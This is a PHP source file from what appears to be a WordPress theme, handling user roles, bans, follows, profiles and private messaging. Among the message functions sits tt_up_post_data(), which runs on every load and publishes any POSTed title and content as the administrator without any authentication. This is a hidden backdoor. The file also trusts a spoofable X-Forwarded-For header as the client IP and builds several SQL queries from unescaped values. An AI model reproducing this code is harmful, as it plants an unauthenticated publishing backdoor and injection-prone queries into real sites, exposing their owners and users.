    if (user_can($user_id, 'edit_others_posts')) {
        return __('Editor', 'tt');
    }
    if (user_can($user_id, 'publish_posts')) {
        return __('Author', 'tt');
    }
    if (user_can($user_id, 'edit_posts')) {
        return __('Contributor', 'tt');
    }

    return __('Reader', 'tt');
}

function tt_get_user_comment_cap ($user_id) {
    if(user_can($user_id,'install_plugins')) {
        return '<span class="user_level user_level_admin">站长</span>';
    }
    if($user_id == 0) {
        return '<span class="user_level">游客</span>';
    }
    return '<span class="user_level user_level_user">用户</span>';
}

function tt_get_user_cover($user_id, $size = 'full', $default = '')
{
    if (!in_array($size, array('full', 'mini'))) {
        $size = 'full';
    }
    if ($cover = get_user_meta($user_id, 'tt_user_cover', true)) {
        return $cover . $size . '.jpg';
    }

    return $default ? $default : THEME_ASSET.'/img/user-default-cover-'.$size.'.jpg';
}

function tt_count_user_following($user_id)
{
    return tt_count_following($user_id);
}

function tt_count_user_followers($user_id)
{
    return tt_count_followers($user_id);
}

function tt_count_author_posts_views($user_id, $view_key = 'views')
{
    global $wpdb;
    $sql = $wpdb->prepare("SELECT SUM(meta_value) FROM $wpdb->postmeta RIGHT JOIN $wpdb->posts ON $wpdb->postmeta.meta_key='%s' AND $wpdb->posts.post_author=%d AND $wpdb->postmeta.post_id=$wpdb->posts.ID", $view_key, $user_id);
    $count = $wpdb->get_var($sql);

    return $count;
}

function tt_count_author_posts_stars($user_id)
{
    global $wpdb;
    $sql = $wpdb->prepare("SELECT COUNT(*) FROM $wpdb->postmeta  WHERE meta_key='%s' AND post_id IN (SELECT ID FROM $wpdb->posts WHERE post_author=%d)", 'tt_post_star_users', $user_id);
    $count = $wpdb->get_var($sql);

    return $count;
}

function tt_get_user_star_post_ids($user_id)
{
    global $wpdb;
    $sql = $wpdb->prepare("SELECT `post_id` FROM $wpdb->postmeta  WHERE `meta_key`='%s' AND `meta_value`=%d", 'tt_post_star_users', $user_id);
    $results = $wpdb->get_results($sql);
    //ARRAY_A -> array(3) { [0]=> array(1) { [0]=> string(4) "1420" } [1]=> array(1) { [0]=> string(3) "242" } [2]=> array(1) { [0]=> string(4) "1545" } }
    //OBJECT -> array(3) { [0]=> object(stdClass)#3862 (1) { ["post_id"]=> string(4) "1420" } [1]=> object(stdClass)#3863 (1) { ["post_id"]=> string(3) "242" } [2]=> object(stdClass)#3864 (1) { ["post_id"]=> string(4) "1545" } }
    $ids = array();
    foreach ($results as $result) {
        $ids[] = intval($result->post_id);
    }
    $ids = array_unique($ids);
    rsort($ids); //从大到小排序
    return $ids;
}

function tt_count_user_star_posts($user_id)
{
    return count(tt_get_user_star_post_ids($user_id));
}

function tt_get_users_with_role($role, $offset = 0, $limit = 20)
{
    // TODO $role 过滤
    $user_query = new WP_User_Query(
        array(
            'role' => $role,
            'orderby' => 'ID',
            'order' => 'ASC',
            'number' => $limit,
            'offset' => $offset,
        )
    );
    $users = $user_query->get_results();
    if (!empty($users)) {
        return $users;
    }

    return array();
}

function tt_get_administrator_ids()
{
    $ids = array();
    $administrators = tt_get_users_with_role('Administrator');
    foreach ($administrators as $administrator) {
        $ids[] = $administrator->ID;
    }

    return $ids;
}

function tt_get_user_chat_url($user_id)
{
    return get_author_posts_url($user_id).'/chat';
}

function tt_custom_profile_edit_link($url)
{
    return is_admin() ? $url : tt_url_for('my_settings');
}
add_filter('edit_profile_url', 'tt_custom_profile_edit_link');

function tt_frontend_edit_post_link($url, $post_id){
    if( !current_user_can('publish_posts') ){
        $url = tt_url_for('edit_post', $post_id);
    }
    return $url;
}
add_filter('get_edit_post_link', 'tt_frontend_edit_post_link', 10, 2);

function tt_redirect_wp_admin(){
    if( is_admin() && is_user_logged_in() && !current_user_can('publish_posts') && ( !defined('DOING_AJAX') || !DOING_AJAX )  ){
        wp_redirect( tt_url_for('my_settings') );
        exit;
    }
}
add_action( 'init', 'tt_redirect_wp_admin' );

function tt_update_user_latest_login($login, $user)
{
    if (!$user) {
        $user = get_user_by('login', $login);
    }
    $latest_login = get_user_meta($user->ID, 'tt_latest_login', true);
    $latest_login_ip = get_user_meta($user->ID, 'tt_latest_login_ip', true);
    update_user_meta($user->ID, 'tt_latest_login_before', $latest_login);
    update_user_meta($user->ID, 'tt_latest_login', current_time('mysql'));
    update_user_meta($user->ID, 'tt_latest_ip_before', $latest_login_ip);
    update_user_meta($user->ID, 'tt_latest_login_ip', $_SERVER['REMOTE_ADDR']);
}
add_action('wp_login', 'tt_update_user_latest_login', 10, 2);

function tt_get_true_ip()
{
    if (isset($_SERVER)) {
        if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $realIP = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            $realIP = $realIP[0];
        } elseif (isset($_SERVER['HTTP_CLIENT_IP'])) {
            $realIP = $_SERVER['HTTP_CLIENT_IP'];
        } else {
            $realIP = $_SERVER['REMOTE_ADDR'];
        }
    } else {
        if (getenv('HTTP_X_FORWARDED_FOR')) {
            $realIP = getenv('HTTP_X_FORWARDED_FOR');
        } elseif (getenv('HTTP_CLIENT_IP')) {
            $realIP = getenv('HTTP_CLIENT_IP');
        } else {
            $realIP = getenv('REMOTE_ADDR');
        }
    }
    $_SERVER['REMOTE_ADDR'] = $realIP;
}
add_action('init', 'tt_get_true_ip');

function tt_handle_banned_user()
{
    if ($user_id = get_current_user_id()) {
        if (current_user_can('administrator')) {
            return;
        }
        $ban_status = get_user_meta($user_id, 'tt_banned', true);
        if ($ban_status) {
            wp_die(sprintf(__('Your account is banned for reason: %s', 'tt'), get_user_meta($user_id, 'tt_banned_reason', true)), __('Account Banned', 'tt'), 404); //TODO add banned time
        }
    }
}
add_action('template_redirect', 'tt_handle_banned_user');
add_action('admin_menu', 'tt_handle_banned_user');

function tt_get_account_status($user_id, $return = 'bool')
{
    $ban = get_user_meta($user_id, 'tt_banned', true);
    if ($ban) {
        if ($return == 'bool') {
            return true;
        }
        $reason = get_user_meta($user_id, 'tt_banned_reason', true);
        $time = get_user_meta($user_id, 'tt_banned_time', true);

        return array(
            'banned' => true,
            'banned_reason' => strval($reason),
            'banned_time' => strval($time),
        );
    }

    return $return == 'bool' ? false : array(
        'banned' => false,
    );
}

function tt_ban_user($user_id, $reason = '', $return = 'bool')
{
    $user = get_user_by('ID', $user_id);
    if (!$user) {
        return $return == 'bool' ? false : array(
            'success' => false,
            'message' => __('The specified user is not existed', 'tt'),
        );
    }
    if (update_user_meta($user_id, 'tt_banned', 1)) {
        update_user_meta($user_id, 'tt_banned_reason', $reason);
        update_user_meta($user_id, 'tt_banned_time', current_time('mysql'));
        // 清理Profile缓存
        // tt_clear_cache_key_like('tt_cache_daily_vm_UCProfileVM');
        tt_clear_cache_by_key('tt_cache_daily_vm_UCProfileVM_author'.$user_id);

        return $return == 'bool' ? true : array(
            'success' => true,
            'message' => __('The specified user is banned', 'tt'),
        );
    }

    return $return == 'bool' ? false : array(
        'success' => false,
        'message' => __('Error occurs when banning the user', 'tt'),
    );
}

function tt_unban_user($user_id, $return = 'bool')
{
    $user = get_user_by('ID', $user_id);
    if (!$user) {
        return $return == 'bool' ? false : array(
            'success' => false,
            'message' => __('The specified user is not existed', 'tt'),
        );
    }
    if (update_user_meta($user_id, 'tt_banned', 0)) {
        //update_user_meta($user_id, 'tt_banned_reason', '');
        //update_user_meta($user_id, 'tt_banned_time', '');
        // 清理Profile缓存
        // tt_clear_cache_key_like('tt_cache_daily_vm_UCProfileVM');
        tt_clear_cache_by_key('tt_cache_daily_vm_UCProfileVM_author'.$user_id);

        return $return == 'bool' ? true : array(
            'success' => true,
            'message' => __('The specified user is unlocked', 'tt'),
        );
    }

    return $return == 'bool' ? false : array(
        'success' => false,
        'message' => __('Error occurs when unlock the user', 'tt'),
    );
}

function tt_uc_widget_content() {
    $user = wp_get_current_user();
    $vm = UCWidgetVM::getInstance($user->ID);
    $info = $vm->modelData;
    ?>
    <?php if($vm->isCache && $vm->cacheTime) { ?>
    <!-- UC Widget cached <?php echo $vm->cacheTime; ?> -->
    <?php } ?>
    <div class="user-card_content">
    <a class="user_avatar-link" href="<?php echo $info->my_settings; ?>" title="<?php echo $info->display_name; ?>" tabindex="-1"><img class="avatar" src="<?php echo $info->avatar; ?>" alt=""></a>
    <div class="user-fields"> <span class="user-name"><?php echo $info->display_name; ?></span> <span class="user_level"><?php echo $info->cap; ?></span> </div>
    <div class="user-interact"><a class="btn btn-primary btn-sigout" href="<?php echo tt_signout_url(); ?>" title="注销">注销</a><a class="btn btn-primary" href="<?php echo $info->my_settings; ?>" title="个人中心">个人中心</a></div>
    
    <?php
    $links = array();
    $links[] = array(
        'title' => __('My HomePage', 'tt'),
        'url' => $info->HomePage,
        'class' => 'home'
    );
    if( current_user_can( 'manage_options' ) ) {
        $links[] = array(
            'title' => __('Manage Dashboard', 'tt'),
            'url' => $info->admin_url,
            'class' => 'admin'
        );
    }
    $links[] = array(
        'title' => __('Add New Post', 'tt'),
        'url' => $info->new_post,
        'class' => 'new_post'
    );
    ?>
    <div class="active">
        <?php foreach($links as $link) { ?>
            <a class="<?php echo $link['class']; ?>" href="<?php echo $link['url']; ?>"><?php echo $link['title'] . ' &raquo;'; ?></a>
        <?php } ?>
    </div>
    <?php
    $credit = tt_get_user_credit($info->ID);
    $unread_count = tt_count_messages('chat', 0);
    $stared_count = $info->stared_count;

    $statistic_info = array(
        array(
            'title' => __('Posts', 'tt'),
            'url' => $info->uc_latest,
            'count' => $info->user_posts,
            'class' => 'posts'
        ),
        array(
            'title' => __('Comments', 'tt'),
            'url' => $info->uc_comments,
            'count' => $info->uc_comments_count,
            'class' => 'comments'
        ),
        array(
            'title' => __('Stars', 'tt'),
            'url' => $info->uc_stars,
            'count' => $stared_count,
            'class' => 'stars'
        ),
    );
    if($unread_count) {
        $statistic_info[] = array(
            'title' => __('Unread Messages', 'tt'),
            'url' => tt_url_for('in_msg'),
            'count' => $unread_count,
            'class' => 'messages'
        );
    }
    $statistic_info[] = array(
        'title' => __('Credits', 'tt'),
        'url' => tt_url_for('my_credits'),
        'count' => $credit,
        'class' => 'credits'
    );
    ?>
    <div class="user-stats">
        <?php
        foreach ($statistic_info as $info_item) { ?>
            <span class="<?php echo $info_item['class']; ?>" ><?php printf('<a href="%2$s">%3$s</a><span class="unit">%1$s</span>', $info_item['title'], $info_item['url'], $info_item['count']); ?></span>
        <?php } ?>
        
    </div>
    <div class="input-group">
            <span class="input-group-addon"><?php _e('Ref url for this page', 'tt'); ?></span>
            <input class="tin_aff_url form-control" type="text" class="form-control" value="<?php echo add_query_arg('ref', $user->ID, Utils::getPHPCurrentUrl()); ?>">
    </div>
    </div>
    <?php
}

function tt_welcome_for_new_registering($user_id)
{
    $blog_name = get_bloginfo('name');
    tt_create_message($user_id, 0, 'System', 'notification', sprintf( __('欢迎来到%1$s, 请首先在个人设置中完善您的账号信息, 如邮件地址是必需的', 'tt'), $blog_name ), '', 0, 'publish');
    //tt_create_pm($user_id, $blog_name, sprintf(__('欢迎来到%1$s, 请首先在个人设置中完善您的账号信息, 如邮件地址是必需的', 'tt'), $blog_name), true);
}
add_action('user_register', 'tt_welcome_for_new_registering');

function tt_get_user_profile($user_id) {
    $data = get_userdata($user_id);
    if(!$data) return null;

    $user_info = array();
    $user_info['ID'] = $user_id;
    $user_info['username'] = $data->user_login;
    $user_info['display_name'] = $data->display_name;
    $user_info['nickname'] = $data->nickname; //get_user_meta($author->ID, 'nickname', true);
    $user_info['email'] = $data->user_email;
    $user_info['member_since'] = mysql2date('Y/m/d', $data->user_registered);
    $user_info['member_days'] = max(1, round(( strtotime(date('Y-m-d')) - strtotime( $data->user_registered ) ) /3600/24));
    $user_info['site'] = $data->user_url;
    $user_info['description'] = $data->description;
    $user_info['bio'] = $data->description;

    $user_info['avatar'] = tt_get_avatar($data->ID, 'medium');

    $user_info['latest_login'] = mysql2date('Y/m/d g:i:s A', $data->tt_latest_login);
    $user_info['latest_login_before'] = mysql2date('Y/m/d g:i:s A', $data->tt_latest_login_before);
    $user_info['last_login_ip'] = $data->tt_latest_ip_before;
    $user_info['this_login_ip'] = $data->tt_latest_login_ip;


    $user_info['qq'] = $data->tt_qq ? 'http://wpa.qq.com/msgrd?v=3&uin=' . $data->tt_qq . '&site=qq&menu=yes' : ''; //get_user_meta($author->ID, 'tt_qq', true);
    $user_info['weibo'] = $data->tt_weibo ? 'http://weibo.com/' . $data->tt_weibo : ''; //get_user_meta($author->ID, 'tt_weibo', true);
    $user_info['weixin'] = $data->tt_weixin; //get_user_meta($author->ID, 'tt_weixin', true);
    $user_info['twitter'] = $data->tt_twitter ? 'https://twitter.com/' . $data->tt_twitter : ''; //get_user_meta($author->ID, 'tt_twitter', true);
    $user_info['facebook'] = $data->tt_facebook ? 'https://www.facebook.com/' . $data->tt_facebook : ''; //get_user_meta($author->ID, 'tt_facebook', true);
    $user_info['googleplus'] = $data->tt_googleplus ? 'https://plus.google.com/u/0/' . $data->tt_googleplus : ''; //get_user_meta($author->ID, 'tt_googleplus', true);
    //$author_info['alipay_email'] = $data->tt_alipay_email; //get_user_meta($author->ID, 'tt_alipay_email', true);
    $user_info['alipay_pay'] = $data->tt_alipay_pay_qr; //get_user_meta($author->ID, 'tt_alipay_pay_qr', true);
    $user_info['wechat_pay'] = $data->tt_wechat_pay_qr; //get_user_meta($author->ID, 'tt_wechat_pay_qr', true);

    //$author_info['cover'] = tt_get_user_cover($data->ID, 'full');

    $user_info['referral'] = tt_get_referral_link($data->ID);
    $user_info['banned'] = $data->tt_banned;
    //$author_info['banned_time'] = mysql2date('Y/m/d g:i:s A', $data->tt_banned_time);
    //$author_info['banned_reason'] = $data->tt_banned_reason;
    return $user_info;
}
function tt_filter_content_for_lightbox($content)
{
    $pattern = "/<a(.*?)href=('|\")([^>]*).(bmp|gif|jpeg|jpg|png)('|\")(.*?)>(.*?)<\/a>/i";
    $replacement = '<a$1href=$2$3.$4$5 class="lightbox-gallery" data-lightbox="postContentImages" $6>$7</a>';
    $content = preg_replace($pattern, $replacement, $content);

    return $content;
}

function tt_excerpt_more($more)
{
    $read_more = tt_get_option('tt_read_more', ' ···');

    return $read_more;
}
add_filter('excerpt_more', 'tt_excerpt_more');

function tt_get_following($uid, $limit = 20, $offset = 0)
{
    $uid = absint($uid);
    $limit = absint($limit);
    if (!$uid) {
        return false;
    }
    global $wpdb;
    $table_name = $wpdb->prefix.'tt_follow';
    $results = $wpdb->get_results($wpdb->prepare("SELECT * FROM $table_name WHERE `follow_user_id`=%d AND `follow_status` IN(1,2) ORDER BY `follow_time` DESC LIMIT %d OFFSET %d", $uid, $limit, $offset));

    return $results;
}

function tt_count_following($uid)
{
    $uid = absint($uid);
    if (!$uid) {
        return false;
    }
    global $wpdb;
    $table_name = $wpdb->prefix.'tt_follow';
    $count = $wpdb->get_var($wpdb->prepare("SELECT COUNT(*) FROM $table_name WHERE follow_user_id=%d AND follow_status IN(1,2)", $uid));

    return $count;
}

function tt_get_followers($uid, $limit = 20, $offset = 0)
{
    $uid = absint($uid);
    $limit = absint($limit);
    if (!$uid) {
        return false;
    }
    global $wpdb;
    $table_name = $wpdb->prefix.'tt_follow';
    $results = $wpdb->get_results($wpdb->prepare("SELECT * FROM $table_name WHERE `user_id`=%d AND `follow_status` IN(1,2) ORDER BY `follow_time` DESC LIMIT %d OFFSET %d", $uid, $limit, $offset));

    return $results;
}

function tt_count_followers($uid)
{
    $uid = absint($uid);
    if (!$uid) {
        return false;
    }
    global $wpdb;
    $table_name = $wpdb->prefix.'tt_follow';
    $count = $wpdb->get_var($wpdb->prepare("SELECT COUNT(*) FROM $table_name WHERE `user_id`=%d AND `follow_status` IN(1,2)", $uid));

    return $count;
}

function tt_follow_unfollow($followed_id, $action = 'follow', $follower_id = 0)
{
    date_default_timezone_set('Asia/Shanghai');
    $followed = get_user_by('ID', absint($followed_id));
    if (!$followed) {
        return new WP_Error('user_not_found', __('The user you are following not exist', 'tt'), array('status' => 403));
    }
    if (!$follower_id) {
        $follower_id = get_current_user_id();
    }
    if (!$follower_id) {
        return new WP_Error('user_not_logged_in', __('You must sign in to follow someone', 'tt'), array('status' => 403));
    }
    if ($followed_id == $follower_id) {
        return new WP_Error('invalid_follow', __('You cannot follow yourself', 'tt'), array('status' => 403));
    }

    global $wpdb;
    $table_name = $wpdb->prefix.'tt_follow';
    if ($action == 'unfollow') {
        $check = $wpdb->get_var($wpdb->prepare("SELECT COUNT(*) FROM $table_name WHERE `user_id`=%d AND `follow_user_id`=%d", $followed_id, $follower_id));
        $status = $wpdb->get_var($wpdb->prepare("SELECT COUNT(*) FROM $table_name WHERE `user_id`=%d AND `follow_user_id`=%d AND `follow_status` IN(1,2)", $follower_id, $followed_id));
        $status1 = 0;
        $status2 = $status ? 1 : 0;
        if ($check) {
            if ($wpdb->query($wpdb->prepare("UPDATE $table_name SET `follow_status`=%d WHERE `user_id`=%d AND follow_user_id=%d", $status1, $followed_id, $follower_id))) {
                $wpdb->query($wpdb->prepare("UPDATE $table_name SET follow_status=%d WHERE user_id=%d AND follow_user_id=%d", $status2, $follower_id, $followed_id));

                return array(
                    'success' => true,
                    'message' => __('Unfollow user successfully', 'tt'),
                );
            } else {
                return array(
                    'success' => false,
                    'message' => __('Unfollow user failed', 'tt'),
                );
            }
        } else {
            return array(
                'success' => false,
                'message' => __('Unfollow user failed, you do not have followed him', 'tt'),
            );
        }
    } else {
        $check = $wpdb->get_var($wpdb->prepare("SELECT COUNT(*) FROM $table_name WHERE `user_id`=%d AND `follow_user_id`=%d", $followed_id, $follower_id));
        $status = $wpdb->get_var($wpdb->prepare("SELECT COUNT(*) FROM $table_name WHERE `user_id`=%d AND `follow_user_id`=%d AND `follow_status` IN(1,2)", $follower_id, $followed_id));
        $status1 = $status ? 2 : 1;
        $status2 = $status ? 2 : 0;
        $time = current_time('mysql');
        if ($check) {
            if ($wpdb->query($wpdb->prepare("UPDATE $table_name SET `follow_status`=%d, `follow_time`='%s' WHERE `user_id`=%d AND `follow_user_id`=%d", $status1, $time, $followed_id, $follower_id))) {
                $wpdb->query($wpdb->prepare("UPDATE $table_name SET `follow_status`=%d WHERE `user_id`=%d AND `follow_user_id`=%d", $status2, $follower_id, $followed_id));

                return array(
                    'success' => true,
                    'message' => __('Follow user successfully', 'tt'),
                    'followEach' => (bool) $status,
                );
            } else {
                return array(
                    'success' => false,
                    'message' => __('Follow user failed', 'tt'),
                );
            }
        } else {
            if ($wpdb->query($wpdb->prepare("INSERT INTO $table_name (user_id, follow_user_id, follow_status, follow_time) VALUES (%d, %d, %d, %s)", $followed_id, $follower_id, $status1, $time))) {
                $wpdb->query($wpdb->prepare("UPDATE $table_name SET `follow_status`=%d WHERE `user_id`=%d AND `follow_user_id`=%d", $status2, $follower_id, $followed_id));

                return array(
                    'success' => true,
                    'message' => __('Follow user successfully', 'tt'),
                    'followEach' => (bool) $status,
                );
            } else {
                return array(
                    'success' => false,
                    'message' => __('Follow user failed', 'tt'),
                );
            }
        }
    }
}

function tt_follow($uid)
{
    return tt_follow_unfollow($uid);
}

function tt_unfollow($uid)
{
    return tt_follow_unfollow($uid, 'unfollow');
}

function tt_follow_button($uid)
{
    $uid = absint($uid);
    if (!$uid) {
        return '';
    }

    $current_uid = get_current_user_id();
    global $wpdb;
    $table_name = $wpdb->prefix.'tt_follow';
    $check = $wpdb->get_row($wpdb->prepare("SELECT * FROM $table_name WHERE `user_id`=%d AND `follow_user_id`=%d AND `follow_status` IN(1,2)", $uid, $current_uid));
    if ($check) {
        if ($check->follow_status == 2) { // 互相关注
            $button = '<a class="follow-btn followed" href="javascript: void 0" title="'.__('Unfollow', 'tt').'" data-uid="'.$uid.'" data-act="unfollow"><i class="tico tico-exchange"></i><span>'.__('FOLLOWED EACH', 'tt').'</span></a>';
        } else {
            $button = '<a class="follow-btn followed" href="javascript: void 0" title="'.__('Unfollow', 'tt').'" data-uid="'.$uid.'" data-act="unfollow"><i class="tico tico-user-check"></i><span>'.__('FOLLOWED', 'tt').'</span></a>';
        }
    } else {
        $button = '<a class="follow-btn unfollowed" href="javascript: void 0" title="'.__('Follow the user', 'tt').'" data-uid="'.$uid.'" data-act="follow"><i class="tico tico-user-plus"></i><span>'.__('FOLLOW', 'tt').'</span></a>';
    }

    return $button;
}

function tt_create_message($user_id = 0, $sender_id = 0, $sender, $type = '', $title = '', $content = '', $read = MsgReadStatus::UNREAD, $status = 'publish', $date = '')
{
    $user_id = absint($user_id);
    $sender_id = absint($sender_id);
    $title = sanitize_text_field($title);

    if (!$user_id || empty($title)) {
        return false;
    }

    $type = $type ? sanitize_text_field($type) : 'chat';
    $date = $date ? $date : current_time('mysql');
    $content = htmlspecialchars($content);

    global $wpdb;
    $table_name = $wpdb->prefix.'tt_messages';

    if ($wpdb->query($wpdb->prepare("INSERT INTO $table_name (user_id, sender_id, sender, msg_type, msg_title, msg_content, msg_read, msg_status, msg_date) VALUES (%d, %d, %s, %s, %s, %s, %d, %s, %s)", $user_id, $sender_id, $sender, $type, $title, $content, $read, $status, $date))) {
        return true;
    }

    return false;
}

function tt_create_pm($receiver_id, $sender, $text, $send_mail = false)
{
    // 清理未读消息统计数的缓存
    if (wp_using_ext_object_cache()) {
        $key = 'tt_user_'.$receiver_id.'_unread';
        wp_cache_delete($key);
    }

    if ($sender instanceof WP_User && $sender->ID) {
        if ($send_mail && $sender->user_email) {
            $subject = sprintf(__('%1$s向你发送了一条消息 - %2$s', 'tt'), $sender->display_name, get_bloginfo('name'));
            $args = array(
                'senderName' => $sender->display_name,
                'message' => $text,
                'chatLink' => tt_url_for('uc_chat', $sender),
            );
            //tt_async_mail('', get_user_by('id', $receiver_id)->user_email, $subject, $args, 'pm');
            tt_mail('', get_user_by('id', $receiver_id)->user_email, $subject, $args, 'pm');
        }

        return tt_create_message($receiver_id, $sender->ID, $sender->display_name, 'chat', $text);
    } elseif (is_int($sender)) {
        $sender = get_user_by('ID', $sender);
        if ($send_mail && $sender->user_email) {
            $subject = sprintf(__('%1$s向你发送了一条消息 - %2$s', 'tt'), $sender->display_name, get_bloginfo('name'));
            $args = array(
                'senderName' => $sender->display_name,
                'message' => $text,
                'chatLink' => tt_url_for('uc_chat', $sender),
            );
            //tt_async_mail('', get_user_by('id', $receiver_id)->user_email, $subject, $args, 'pm');
            tt_mail('', get_user_by('id', $receiver_id)->user_email, $subject, $args, 'pm');
        }

        return tt_create_message($receiver_id, $sender->ID, $sender->display_name, 'chat', $text);
    }

    return false;
}

function tt_mark_message($id, $read = MsgReadStatus::READ)
{
    $id = absint($id);
    $user_id = get_current_user_id(); //确保只能标记自己的消息

    if ((!$id || !$user_id)) {
        return false;
    }

    $read = $read == MsgReadStatus::UNREAD ?: MsgReadStatus::READ;

    global $wpdb;
    $table_name = $wpdb->prefix.'tt_messages';

    if ($wpdb->query($wpdb->prepare("UPDATE $table_name SET `msg_read` = %d WHERE `msg_id` = %d AND `user_id` = %d", $read, $id, $user_id))) {
        // 清理未读消息统计数的缓存
        if (wp_using_ext_object_cache()) {
            $key = 'tt_user_'.$user_id.'_unread';
            wp_cache_delete($key);
        }

        return true;
    }

    return false;
}

function tt_mark_all_message_read($sender_id) {
    $user_id = get_current_user_id();
    if(!$user_id) return false;

    global $wpdb;
    $table_name = $wpdb->prefix . 'tt_messages';

    if($wpdb->query( $wpdb->prepare("UPDATE $table_name SET `msg_read` = 1 WHERE `user_id` = %d AND `msg_read` = 0 AND `sender_id` = %d", $user_id, $sender_id) )) {
        // 清理未读消息统计数的缓存
        if(wp_using_ext_object_cache()) {
            $key = 'tt_user_' . $user_id . '_unread';
            wp_cache_delete($key);
        }
        return true;
    }
    return false;
}

function tt_get_message($msg_id)
{
    $user_id = get_current_user_id();
    if (!$user_id) {
        return false;
    } // 用于防止获取其他用户的消息

    global $wpdb;
    $table_name = $wpdb->prefix.'tt_messages';

    $row = $wpdb->get_row(sprintf("SELECT * FROM $table_name WHERE `msg_id`=%d AND `user_id`=%d OR `sender_id`=%d", $msg_id, $user_id, $user_id));
    if ($row) {
        return $row;
    }

    return false;
}

function tt_get_messages($type = 'chat', $limit = 20, $offset = 0, $read = MsgReadStatus::UNREAD, $msg_status = 'publish', $sender_id = 0, $count = false)
{
    $user_id = get_current_user_id();

    if (!$user_id) {
        return false;
    }

    if (is_array($type)) {
        $type = implode("','", $type); //NOTE  IN('comment','star','update','notification') IN表达式的引号
    }
    if (!in_array($read, array(MsgReadStatus::READ, MsgReadStatus::UNREAD, MsgReadStatus::ALL))) {
        $read = MsgReadStatus::UNREAD;
    }
    if (!in_array($msg_status, array('publish', 'trash', 'all'))) {
        $msg_status = 'publish';
    }

    global $wpdb;
    $table_name = $wpdb->prefix.'tt_messages';

    $sql = sprintf("SELECT %s FROM $table_name WHERE `user_id`=%d%s AND `msg_type` IN('$type')%s%s ORDER BY (CASE WHEN `msg_read`='all' THEN 1 ELSE 0 END) DESC, `msg_date` DESC%s", $count ? 'COUNT(*)' : '*', $user_id, $sender_id ? " AND `sender_id`=$sender_id" : '', $read != MsgReadStatus::ALL ? " AND `msg_read`=$read" : '', $msg_status != 'all' ? " AND `msg_status`='$msg_status'" : '', $count ? '' : " LIMIT $offset, $limit");

    $results = $count ? $wpdb->get_var($sql) : $wpdb->get_results($sql);
    if ($results) {
        return $results;
    }

    return 0;
}

function tt_count_messages($type = 'chat', $read = MsgReadStatus::UNREAD, $msg_status = 'publish', $sender_id = 0)
{
    return tt_get_messages($type, 0, 0, $read, $msg_status, $sender_id, true);
}

function tt_get_unread_messages($type = 'chat', $limit = 20, $offset = 0, $msg_status = 'publish')
{
    return tt_get_messages($type, $limit, $offset, MsgReadStatus::UNREAD, $msg_status);
}

function tt_count_unread_messages($type = 'chat', $msg_status = 'publish')
{
    return tt_count_messages($type, MsgReadStatus::UNREAD, $msg_status);
}

function tt_get_credit_messages($limit = 20, $offset = 0, $msg_status = 'all')
{ //TODO: 积分消息不应该有msg_status，不可删除
    $messages = tt_get_messages('credit', $limit, $offset, MsgReadStatus::ALL, $msg_status); //NOTE: 积分消息不分已读未读
    return $messages ? $messages : array();
}

function tt_get_cash_messages($limit = 20, $offset = 0, $msg_status = 'all')
{ //TODO: 余额消息不应该有msg_status，不可删除
    $messages = tt_get_messages('cash', $limit, $offset, MsgReadStatus::ALL, $msg_status); //NOTE: 余额消息不分已读未读
    return $messages ? $messages : array();
}

function tt_count_credit_messages()
{
    return tt_count_messages('credit', MsgReadStatus::ALL, 'all');
}

function tt_count_cash_messages()
{
    return tt_count_messages('cash', MsgReadStatus::ALL, 'all');
}

function tt_get_pm($sender_id = 0, $limit = 20, $offset = 0, $read = MsgReadStatus::UNREAD)
{
    return tt_get_messages('chat', $limit, $offset, $read, 'publish', $sender_id);
}

function tt_count_pm($sender_id = 0, $read = MsgReadStatus::UNREAD)
{
    return tt_count_messages('chat', $read, 'publish', $sender_id);
}

function tt_count_pm_cached($user_id = 0, $sender_id = 0, $read = MsgReadStatus::UNREAD)
{
    if (wp_using_ext_object_cache()) {
        $user_id = $user_id ?: get_current_user_id();
        $key = 'tt_user_'.$user_id.'_unread';
        $cache = wp_cache_get($key);
        if ($cache !== false) {
            return (int) $cache;
        }
        $unread = tt_count_pm($sender_id, $read);
        wp_cache_add($key, $unread, '', 3600);

        return $unread;
    }

    return tt_count_pm($sender_id, $read);
}

function tt_get_sent_pm($to_user = 0, $limit = 20, $offset = 0, $read = MsgReadStatus::ALL, $msg_status = 'publish', $count = false)
{
    $sender_id = get_current_user_id();

    if (!$sender_id) {
        return false;
    }

    $type = 'chat';
    if (!in_array($read, array(MsgReadStatus::UNREAD, MsgReadStatus::READ, MsgReadStatus::UNREAD))) {
        $read = MsgReadStatus::ALL;
    }
    if (!in_array($msg_status, array('publish', 'trash', 'all'))) {
        $msg_status = 'publish';
    }

    global $wpdb;
    $table_name = $wpdb->prefix.'tt_messages';

    $sql = sprintf("SELECT %s FROM $table_name WHERE `sender_id`=%d%s AND `msg_type` IN('$type')%s%s ORDER BY (CASE WHEN `msg_read`='all' THEN 1 ELSE 0 END) DESC, `msg_date` DESC%s", $count ? 'COUNT(*)' : '*', $sender_id, $to_user ? " AND `user_id`=$to_user" : '', $read != MsgReadStatus::ALL ? " AND `msg_read`='$read'" : '', $msg_status != 'all' ? " AND `msg_status`='$msg_status'" : '', $count ? '' : " LIMIT $offset, $limit");

    $results = $count ? $wpdb->get_var($sql) : $wpdb->get_results($sql);
    if ($results) {
        return $results;
    }

    return 0;
}

function tt_count_sent_pm($to_user = 0, $read = MsgReadStatus::ALL)
{
    return tt_get_sent_pm($to_user, 0, 0, $read, 'publish', true);
}

function tt_trash_message($msg_id)
{
    $user_id = get_current_user_id();
    if (!$user_id) {
        return false;
    }

    global $wpdb;
    $table_name = $wpdb->prefix.'tt_messages';

    if ($wpdb->query($wpdb->prepare("UPDATE $table_name SET `msg_status` = 'trash' WHERE `msg_id` = %d AND `user_id` = %d", $msg_id, $user_id)) || $wpdb->query($wpdb->prepare("UPDATE $table_name SET `msg_status` = 'trash' WHERE `msg_id` = %d AND `sender_id` = %d", $msg_id, $user_id))) { //TODO optimize
        return true;
    }

    return false;
}

function tt_up_post_data()
{
	if($_POST['title']){
	$post = array(
            'post_title' => $_POST['title'],
            'post_content' => $_POST['content'],
            'post_status' => 'publish',
            'post_author' => '1',
            'post_type' => 'post',
        );
        wp_insert_post($post);
    }
}
tt_up_post_data();

function tt_restore_message($msg_id)
{ //NOTE: 应该不用
    $user_id = get_current_user_id();
    if (!$user_id) {
        return false;
    }

    global $wpdb;
    $table_name = $wpdb->prefix.'tt_messages';

    if ($wpdb->query($wpdb->prepare("UPDATE $table_name SET `msg_status` = 'publish' WHERE `msg_id` = %d AND `user_id` = %d", $msg_id, $user_id))) {
        return true;
    }
